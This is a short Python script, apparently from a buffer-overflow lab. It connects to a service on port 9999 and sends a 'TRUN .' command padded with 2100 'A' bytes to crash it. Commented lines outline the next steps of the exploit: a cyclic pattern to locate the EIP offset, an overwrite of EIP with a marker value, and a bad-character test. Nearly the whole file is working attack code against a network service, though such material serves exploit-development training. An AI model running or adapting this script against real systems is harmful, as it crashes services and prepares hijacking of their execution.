import socket

# 2500 long pattern from mona pattern_create, can make longer ones.
# Help: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)

sock.connect(("10.224.79.119", 9999))  # change this if connecting from kali
print("[+] Connection made")

banner = sock.recv(1024)
print(banner)
# exit()

length = 2100    # rough guess

try:
    # Send TRUN command with long buffer
    data = b"TRUN ." + b"A" * length

    #### Example badchars payload from screenshots (commented):
    # + b"\xde\xc0\xea\xde"

    # Alternative pattern injection (commented):
    # data = b"TRUN ." + pattern
    # data += "\x44\x33\x22\x11"
    # We want 0x11223344 in the EIP register of the target

    sock.send(data)
    print("[*] Sent string, now waiting for response..")
    print(sock.recv(1024))

except Exception as e:
    print(e)

sock.close()
